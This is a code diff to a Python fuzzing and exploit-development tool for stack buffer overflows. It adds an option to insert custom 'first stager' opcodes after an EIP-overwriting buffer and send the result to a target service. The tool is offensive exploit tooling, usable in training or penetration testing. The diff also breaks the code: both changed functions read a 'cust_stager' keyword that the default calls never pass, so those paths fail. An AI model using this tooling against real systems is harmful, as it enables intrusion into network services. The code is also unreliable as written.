@@ -157,14 +157,24 @@ class FuzzLib(object):
 		return str(string_buffer)
 
 	@staticmethod
-	def locate_space_4_shellcode(b_size, b_location):
-		string_buffer = "A" * b_location + "B" * 4 + "C" * (b_size - b_location - 4) 
+	def locate_space_4_shellcode(b_size, b_location, **kwargs):
+		first_stager = "C" * (b_size - b_location - 4)
 
-		return str(string_buffer)
+		if(kwargs['cust_stager'] != None):
+			first_stager = kwargs['cust_stager']
+		
+		string_buffer = "A" * b_location + "B" * 4 + first_stager
+
+		return str(string_buffer).decode('string-escape')
 
 	@staticmethod
-	def test_return_address(b_location, return_address):
-		string_buffer = "A" * b_location + return_address + "C" * 390 
+	def test_return_address(b_location, return_address, **kwargs):
+		first_stager = "C" * 390
+
+		if(kwargs['cust_stager'] != None):
+			first_stager = kwargs['cust_stager']
+
+		string_buffer = "A" * b_location + return_address + first_stager
 
 		return str(string_buffer).decode('string-escape')
 
@@ -288,6 +298,9 @@ def main():
 			help='''location of the buffer offset that overwrote the EIP register after using the
 			--rand command to send a buffer. Use the --find-offset argument with the -s and the
 			-e argument.''')
+	parser.add_argument('--cust-stager', dest='custom_first_stager', type=str, metavar='<custom first stager>',
+			help='''custom first stager opcodes to execute in order to direct execution flow to final
+			shellcode location. Used only with --locate-space-4-shellcode and --find-return-addr.''')
 	parser.add_argument('--check-badchars', dest='check_badchars', action='store_true',
 			help='''send a list of ALL possible characters in hex (x00 to xff) to check 
 			what characters are bad and let us know what characters to not include in our buffer, 
@@ -382,6 +395,9 @@ def main():
 				char_invalid_msg = '''use the -l argument to provide the location of the buffer offset that overwrote the EIP register after using the --rand command to send a buffer. Use the --find-offset argument with the -s and the -e argument to locate the specific offset value'''
 				raise argparse.ArgumentTypeError(char_invalid_msg)
 				return False
+			elif args.custom_first_stager != None:
+				result = fuzz_l.locate_space_4_shellcode(args.buffer_size, args.single_buff_location, cust_stager=args.custom_first_stager)
+				send_buffer(conn, args.buffer_to_fuzz, result)
 			else:
 				result = fuzz_l.locate_space_4_shellcode(args.buffer_size, args.single_buff_location)
 				send_buffer(conn, args.buffer_to_fuzz, result)
@@ -391,6 +407,9 @@ def main():
 				char_invalid_msg = '''Both the -l and -a arguments must be used. Use --help for usage information'''
 				raise argparse.ArgumentTypeError(char_invalid_msg)
 				return False
+			elif args.custom_first_stager != None:
+				result = fuzz_l.test_return_address(args.single_buff_location, args.return_address, cust_stager=args.custom_first_stager)
+				send_buffer(conn, args.buffer_to_fuzz, result)
 			else:
 				result = fuzz_l.test_return_address(args.single_buff_location, args.return_address)
 				send_buffer(conn, args.buffer_to_fuzz, result)		
